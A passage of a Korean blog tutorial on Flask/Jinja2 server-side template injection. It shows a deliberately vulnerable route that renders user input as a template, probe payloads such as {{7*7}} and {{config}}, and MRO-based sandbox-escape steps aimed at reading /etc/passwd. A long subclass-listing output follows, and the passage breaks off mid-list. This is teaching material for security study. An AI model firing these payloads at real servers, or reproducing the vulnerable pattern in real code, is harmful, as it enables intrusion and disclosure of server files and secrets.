keyword\">def</span> <span class=\"token function\">root</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tuser <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'user'</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> user<span class=\"token punctuation\">:</span>\n\t\tuser <span class=\"token operator\">=</span> <span class=\"token string\">'guest'</span>\n\tt_plate <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''&lt;h1>So Good! %s'''</span><span class=\"token operator\">%</span>user\n\t<span class=\"token keyword\">return</span> render_template_string<span class=\"token punctuation\">(</span>t_plate<span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>jinja2 템플릿 문법은 다음과 같이 사용이 되며 <code class=\"language-text\">{{code}}</code> code는 Python 문법으로 사용하시면 됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> Code <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> <span class=\"token number\">7</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span>Rendering<span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token number\">49</span></code></pre></div>\n<ul>\n<li>내부 적으로 Python이 처리되면서 <code class=\"language-text\">built_in function</code>이 동작이 수행됩니다.</li>\n<li>다음 <code class=\"language-text\">config</code> 는 애플리케이션 설정이 담긴 변수이며 출력하게 될시 서버의 다양한 정보를 확인할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>config<span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span> <span class=\"token comment\"># 애플리케이션 설정 값이 담긴 변수 </span>\n\n<span class=\"token operator\">=</span> Rendering <span class=\"token operator\">=</span>\n <span class=\"token operator\">&lt;</span>Config <span class=\"token punctuation\">{</span><span class=\"token string\">'JSON_AS_ASCII'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'USE_X_SENDFILE'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_COOKIE_SECURE'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_COOKIE_PATH'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_COOKIE_DOMAIN'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_COOKIE_NAME'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'session'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'MAX_COOKIE_SIZE'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">4093</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_COOKIE_SAMESITE'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'PROPAGATE_EXCEPTIONS'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'ENV'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'production'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'DEBUG'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'EXPLAIN_TEMPLATE_LOADING'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'MAX_CONTENT_LENGTH'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'APPLICATION_ROOT'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SERVER_NAME'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'PREFERRED_URL_SCHEME'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'http'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'JSONIFY_PRETTYPRINT_REGULAR'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'TESTING'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'PERMANENT_SESSION_LIFETIME'</span><span class=\"token punctuation\">:</span> datetime<span class=\"token punctuation\">.</span>timedelta<span class=\"token punctuation\">(</span><span class=\"token number\">31</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'TEMPLATES_AUTO_RELOAD'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'TRAP_BAD_REQUEST_ERRORS'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'JSON_SORT_KEYS'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'JSONIFY_MIMETYPE'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'application/json'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_COOKIE_HTTPONLY'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SEND_FILE_MAX_AGE_DEFAULT'</span><span class=\"token punctuation\">:</span> datetime<span class=\"token punctuation\">.</span>timedelta<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'PRESERVE_CONTEXT_ON_EXCEPTION'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_REFRESH_EACH_REQUEST'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'TRAP_HTTP_EXCEPTIONS'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">}</span><span class=\"token operator\">></span> !!!</code></pre></div>\n<h3 id=\"ssti-sandbox-escape\" style=\"position:relative;\"><a href=\"#ssti-sandbox-escape\" aria-label=\"ssti sandbox escape permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSTI Sandbox Escape</h3>\n<ul>\n<li>대상 서버 환경에서 파일 읽기 및 시스템 함수를 호출하기 위해서는 SandBox를 탈출해야 합니다.</li>\n<li><code class=\"language-text\">open('/etc/passwd', 'rb').read()</code> 형태로 사용이 불가능 합니다.</li>\n<li>SandBox 탈출하기 위해서는 MRO를 이용하여 사용할 수 있는 클래스를 찾아야 합니다.</li>\n</ul>\n<p>Method Resolution Order (<strong>MRO)?</strong></p>\n<ul>\n<li>python 클래스 계층 구조에서 메서드를 찾는 순서 입니다.</li>\n<li>현재 클래스와 연관된 모든 클래스를 확인할 수 있습니다.</li>\n</ul>\n<p><strong>SSTI MRO</strong></p>\n<ul>\n<li>호출을 하게 되면 <code class=\"language-text\">&lt;type 'str'></code>, <code class=\"language-text\">&lt;type 'basestring'></code>, <code class=\"language-text\">&lt;type 'object'></code> 3가지 가 출력됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>그중에서 object class로 들어가서 서브 클래스를 출력하고 싶다면 다음과 같이 object의 서브 클래스들을 출력하면 됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__subclass__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>\n<p><strong>response</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'type'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'weakref'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'weakcallableproxy'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'weakproxy'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'int'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'basestring'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'bytearray'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'list'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'NoneType'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'NotImplementedType'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'traceback'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'super'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'xrange'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'dict'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'set'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'slice'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'staticmethod'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'complex'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'float'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'buffer'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'long'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'frozenset'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'property'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'memoryview'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'tuple'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'enumerate'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'reversed'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'code'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'frame'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'builtin_function_or_method'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'instancemethod'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'function'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'classobj'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'dictproxy'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'generator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'getset_descriptor'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'wrapper_descriptor'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'instance'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'ellipsis'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'member_descriptor'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'file'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'PyCapsule'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'cell'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'callable-iterator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'iterator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'sys.long_info'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'sys.float_info'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'EncodingMap'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'fieldnameiterator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'formatteriterator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'sys.version_info'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'sys.flags'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'exceptions.BaseException'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'module'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'imp.NullImporter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'zipimport.zipimporter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'posix.stat_result'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'posix.statvfs_result'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'warnings.WarningMessage'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'warnings.catch_warnings'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_weakrefset._IterationGuard'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_weakrefset.WeakSet'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_abcoll.Hashable'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'classmethod'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_abcoll.Iterable'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_abcoll.Sized'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_abcoll.Container'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_abcoll.Callable'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'dict_keys'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'dict_items'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'dict_values'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'site._Printer'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'site._Helper'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_sre.SRE_Pattern'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_sre.SRE_Match'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_sre.SRE_Scanner'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'site.Quitter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'codecs.IncrementalEncoder'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'codecs.IncrementalDecoder'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'string.Template'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'string.Formatter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'collections.deque'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'deque_iterator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'deque_reverse_iterator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'operator.itemgetter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'operator.attrgetter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'operator.methodcaller'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.combinations'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.combinations_with_replacement'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.cycle'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.dropwhile'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.takewhile'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.islice'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.starmap'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.imap'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.chain'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.compress'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.ifilter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.ifilterfalse'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.count'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.izip'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.izip_longest'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.permutations'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.product'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.repeat'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.groupby'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.tee_dataobject'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.tee'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools._grouper'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_thread._localdummy'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'thread._local'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'thread.lock'</span><span class=\"token operator\">></span><span class=\"token 